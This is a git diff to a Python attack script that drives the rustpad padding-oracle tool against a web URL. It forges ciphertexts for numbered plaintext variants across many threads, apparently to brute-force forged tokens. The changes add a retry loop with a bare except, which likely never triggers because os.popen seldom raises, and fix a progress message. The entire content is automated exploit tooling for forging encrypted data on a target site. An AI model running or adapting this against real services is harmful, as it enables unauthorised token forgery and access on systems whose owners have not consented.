@@ -6,7 +6,15 @@ from threading import Thread
 
 def worker(job_number, from_thread=True):
     new_plaintext_append_number = re.sub(r"FUZZ", str(job_number), new_plaintext_append)
-    new_ciphertext = os.popen(f'./rustpad web --oracle "{url}" -D "0000000000000000" -E "{new_plaintext_append_number}" -B 8 --no-iv -t 10').read().strip()
+    for i in range(0, 3):
+        encountered_error = False
+        try:
+            new_ciphertext = os.popen(f'./rustpad web --oracle "{url}" -D "0000000000000000" -E "{new_plaintext_append_number}" -B 8 --no-iv -t 10').read().strip()
+            break
+        except:
+            encountered_error = True
+        if encountered_error:
+            print(f"Retrying job {job_number} ({i+1}/3)")
     start = len(new_ciphertext) - 48
     new_ciphertext = new_ciphertext[start:len(new_ciphertext)]
     ciphertext = ciphertext_base + new_ciphertext
@@ -52,7 +60,7 @@ if __name__ == "__main__":
     for i in range(job_start, job_end, direction):
         thread_arr.append(Thread(target=worker, args=(i,)))
         if len(thread_arr) >= threads:
-            print(f"Starting job {i - (threads-1)} - {i*direction}")
+            print(f"Starting job {i - (threads-1)} - {i}")
             for thread in thread_arr:
                 thread.start()
             for thread in thread_arr:
